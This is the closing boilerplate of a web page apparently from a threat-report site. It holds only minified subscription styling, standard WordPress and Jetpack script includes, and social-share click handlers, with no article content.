.components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"22587\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "22587" ]);
/* ]]> */
</script>
<script type="2d56ff63091f999082d29cc6-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="2d56ff63091f999082d29cc6-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="2d56ff63091f999082d29cc6-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="2d56ff63091f999082d29cc6-|49" defer></script></body>
</html>
